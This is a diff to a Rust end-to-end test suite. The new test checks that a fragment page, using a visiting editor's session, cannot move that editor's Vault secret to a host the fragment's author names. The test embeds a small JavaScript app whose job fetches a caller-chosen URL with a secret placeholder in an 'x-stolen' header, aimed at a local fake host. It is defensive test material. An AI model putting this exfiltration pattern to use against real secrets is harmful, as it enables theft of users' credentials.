@@ -1,10 +1,12 @@
 //! Membership as live cell state: grants, invites by email, leaving, the
 //! per-person list, and secrets sealed in the cell.
 
+use std::sync::{Arc, Mutex};
 use std::time::{Duration, Instant};
 
 use anyhow::Result;
 use fragment_core::npub;
+use fragment_fakes::http::{Handler, Response, Server};
 use fragment_nip98::Keys;
 use fragment_proto::{limits, ErrorCode};
 use serde_json::{json, Value};
@@ -1050,6 +1052,79 @@ pub fn secrets(s: &mut Suite, api: &Api) -> Result<()> {
         json!(raced),
     );
     vault(&owner, "DELETE", "/api/vault/nostr-e2e", None)?;
+    Ok(())
+}
+
+/// An ordinary fragment's app, its author's own code: a job that sends the
+/// fragment's `STOLEN` to the URL its caller names.
+const TAKER_APP: &str = r#"import { DurableObject } from "cloudflare:workers";
+
+export class App extends DurableObject {
+  async send({ url }, job) {
+    const r = await job.fetch(url, { headers: { "x-stolen": "{{STOLEN}}" } });
+    return { status: r.status };
+  }
+}
+"#;
+const TAKER_JSON: &str = r#"{ "operations": { "send": { "kind": "job" } } }"#;
+
+/// A Vault secret is its person's to move, never a page's (docs/secrets.md,
+/// "Only its person says where a value goes"): the page of an ordinary
+/// fragment (its author's own code, no connector of the platform's) asks
+/// `fromVault` with a visiting editor's session, as its script would,
+/// naming a host of its author's. Nothing leaves the Vault, the fragment
+/// is given nothing, and its author's job carries nothing of theirs to
+/// that host.
+pub fn secrets_page(s: &mut Suite, api: &Api) -> Result<()> {
+    if !s.section("secrets-page", &[crate::Need::Fakes]) {
+        return Ok(());
+    }
+    // the host its author controls: what arrived in `x-stolen`, each time
+    let seen: Arc<Mutex<Vec<String>>> = Arc::default();
+    let log = Arc::clone(&seen);
+    let handler: Handler = Arc::new(move |req| {
+        log.lock().expect("the host's log").push(req.header("x-stolen").unwrap_or("").to_string());
+        Response::json(200, &json!({ "ok": true }))
+    });
+    let host = Server::start(0, handler)?;
+
+    let author = api.person()?;
+    let visitor = api.person()?;
+    let name = s.named(api, &author, "taker")?;
+    let c = s.create(api, &author, &name)?;
+    super::app::ship(s, &c, TAKER_APP.as_bytes(), TAKER_JSON.as_bytes());
+    // private, the visitor its editor by their own yes to its author's invite
+    let private = api.signed(&author, "PUT", &format!("/api/f/{name}/visibility"), Some(&json!({ "visibility": "members" })))?;
+    let invited = api.signed(&author, "POST", &format!("/api/f/{name}/invites"), Some(&json!({ "email": Api::email_of(&visitor), "role": "editor" })))?;
+    let joined = api.signed(&visitor, "POST", &format!("/api/invites/{name}/accept"), Some(&json!({})))?;
+    anyhow::ensure!(private.status == 200 && invited.status == 200 && joined.status == 200, "its author's fragment, private, the visitor its editor: {private} {invited} {joined}");
+    // the visitor's Vault: a token they pointed at Telegram alone
+    let token = format!("123456:vault-kept-{}", &Keys::generate().pubkey_hex()[..16]);
+    let parked = api.signed(&visitor, "PUT", "/api/vault/telegram-e2e", Some(&json!({ "value": token, "hosts": ["api.telegram.org"], "agents": [agent_id_name(&name)] })))?;
+    anyhow::ensure!(parked.status == 200, "the visitor's vault: {parked}");
+    let before = api.signed(&visitor, "GET", "/api/vault", None)?;
+    // the visitor on the fragment's origin, and its page's call as their
+    // browser sends it: same-origin, their cookie, JSON, nothing else of theirs
+    let cookie = format!("fragment_site={}", super::signin::site_cookie(api, &api.sign_in(&Api::email_of(&visitor))?, &name)?);
+    let body = json!({ "fromVault": "telegram-e2e", "hosts": ["127.0.0.1"] });
+    let extra = vec![("origin", api.site_origin(&name)), ("sec-fetch-site", "same-origin".to_string()), ("sec-fetch-mode", "cors".to_string()), ("sec-fetch-dest", "empty".to_string())];
+    let asked = api.call(api::Call { method: "PUT", url: api.site_url(&name, "__secrets/STOLEN"), body: Some(body.to_string().into_bytes()), content_type: Some("application/json"), cookie: Some(cookie), extra, ..api::Call::default() })?;
+    let held = api.signed(&visitor, "GET", "/api/vault", None)?;
+    let kept = api.signed(&author, "GET", &format!("/api/f/{name}/secrets"), None)?;
+    s.ok(
+        "a fromVault move asked from the page of an ordinary fragment (its author's own code), with a visiting editor's session, takes nothing from their Vault and stores nothing: their Vault lists the secret as it was, its hosts theirs, and the fragment holds no such secret",
+        held.status == 200 && held.body == before.body && kept.status == 200 && kept.body["secrets"] == json!([]),
+        json!({ "asked": asked.status, "answer": asked.body, "vaultBefore": before.body, "vault": held.body, "fragment": kept.body }),
+    );
+    // its author runs the job: its fetch names `{{STOLEN}}` toward their host
+    let r = api.op(&author, &name, "send", "send-1", json!({ "url": format!("{}/take", host.url) }))?;
+    let run = super::jobs::settle(api, &author, &name, super::jobs::started(&r), &["succeeded", "held"], Duration::from_secs(40));
+    let got = seen.lock().expect("the host's log").clone();
+    s.ok(
+        "and its author's job carries nothing of theirs to the host its page named",
+        !got.iter().any(|v| v.contains(&token)),
+        json!({ "run": run["status"], "requestsReceived": got.len(), "theirValueInClear": got.iter().any(|v| v == &token) }),
+    );
     Ok(())
 }
 
